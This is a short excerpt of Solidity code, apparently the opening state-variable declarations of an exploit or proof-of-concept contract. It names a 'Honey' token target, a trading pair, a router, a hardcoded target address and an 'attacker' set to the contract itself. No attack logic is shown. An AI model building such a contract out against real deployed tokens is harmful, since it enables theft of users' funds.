    // ─── State Variables ─────────────────────────────────────
    Honey public target;
    address public owner;
    address public pair;
    IRouter public router;

    address constant TARGET = 0x6927BA6c0068Ca8584EeA45f2b5dF02ddecD1bEA;
    address attacker = address(this);

